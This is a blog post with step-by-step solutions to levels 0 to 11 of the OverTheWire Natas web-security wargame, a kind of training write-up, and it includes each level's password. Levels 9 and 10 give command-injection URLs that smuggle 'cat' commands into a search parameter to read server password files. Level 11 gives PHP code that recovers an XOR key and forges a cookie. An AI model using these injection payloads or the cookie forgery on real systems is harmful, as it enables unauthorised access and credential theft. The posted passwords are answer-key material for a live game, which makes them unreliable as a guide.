---
layout:     post
title:      "Natas"
subtitle:   "Solutions"
date:       2016-01-22 9:00:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>

<p>I spent last day an hour or something on natas , the website would be very familiar to you. It was the website from which I first started to learn linux commands and the same people who run banditoverwire. Actually came to know from wechall.net, well that was also new to me :) But I could assure you that if you want to start with web exploitation as a CTF point of you, this is http://natas.natas.labs.overthewire.org very good option.</p>

<p>Challenge 00</p>

<p>See the source code.</p>

<blockquote>pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto</blockquote>

<p>Challenge 01</p>

<p>Go to developer option by clicking F12</p>

<blockquote>pass:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</blockquote>

<p>Challenge 02</p>

<p>Goto files directory</p>

<blockquote>pass:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</blockquote>

<p>Challenge 03</p>

<p>Open the robots.txt you will get the file which contain pass to next level.</p>

<blockquote>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</blockquote>

<p>Challenge 04</p>

<p>Use a burp suite and change the referrer</p>

<blockquote>Referer: http://natas5.natas.labs.overthewire.org/ <br>
            pass:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
</blockquote>

<p>Challenge 05</p>

<p>You have to change the cookie of login from 0 to 1, using edit my cookie or firebug</p>

<blockquote>pass:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</blockquote>

<p>Challenge 06</p>

<p> You can easily get the secret using the page source, when you get the secret.
Give a post request using secret and a submit. Write a script or use postman in chrome.
</p>

<blockquote>pass:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</blockquote>

<p>Challenge 07</p>

<p>Remote file inclusion</p>

<blockquote>pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</blockquote>

<p>Challenge 08</p>

<p>Exploit</p>

<blockquote><?phpecho base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));?></blockquote>

<blockquote>pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</blockquote>

<p>Challenge 09</p>

<p>Exploit</p>

<p>http://natas9.natas.labs.overthewire.org/?needle[]=ls&needle=;cat%20/etc/natas_webpass/natas10<p>

<blockquote>Pass:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</blockquote>

<p>Challenge 10</p>

<p>There are exactly 2 ways to solve the challenge, one is going back to challenge 9
and entering ".* /etc/natas_webpass/natas11"</p>

<p>Solution 2 would be by using line feed you can observer we can execute the command and %20 for space. So the exploit look like this.</p>

<blockquote>http://natas10.natas.labs.overthewire.org/?needle[]=.*%20/etc/natas_webpass/natas11&needle=%0acat%20.*%20/etc/natas_webpass/natas11</blockquote>

<blockquote>pass:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</blockquote>

<p>challenge 11</p>

<p>Getting the key</p>

<blockquote>
<?php<br>
<br>
	$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");<br>
	$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";<br>
	function xor_encrypt($in,$key) {<br>
		$text = $in;<br>
		$outText = '';<br>
		// Iterate through each character<br>
		for($i=0;$i<strlen($text);$i++) {<br>
			$outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
		}<br>
		<br>
		return $outText;<br>
        }<br>
	$key = xor_encrypt(json_encode($defaultdata), base64_decode($cookie));<br>
	echo $key;<br>
	echo "\n";<br>
<br>
?><br>
</blockquote>

<p>Get the cookie</p>
<blockquote>
<?php<br>
	$defaultdata = array( "showpassword"=>"Yes", "bgcolor"=>"#ffffff");<br>
	function xor_encrypt($in) {<br>
	    $key = 'qw8J';<br>
	    $text = $in;<br>
	    $outText = '';<br>
	    // Iterate through each character<br>
	     for($i=0;$i<strlen($text);$i++) {<br>
		        $outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
     	     }<br>
                return $outText;<br>
	}<br>
	$newcookie = base64_encode(xor_encrypt(json_encode($defaultdata)));<br>
	echo " \n ------------------------------------\n";<br>
	echo " \n             New cookie              \n";<br>
	echo $newcookie;<br>
<br>
	echo " \n ------------------------------------\n";<br>
?><br>
</blockquote>

<p>Add this cookie data</p>

<blockquote>pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</blockquote>

<p>Wait for the next blog, will be soon back!</p>

<p>Thank you for reading the blog! </p>
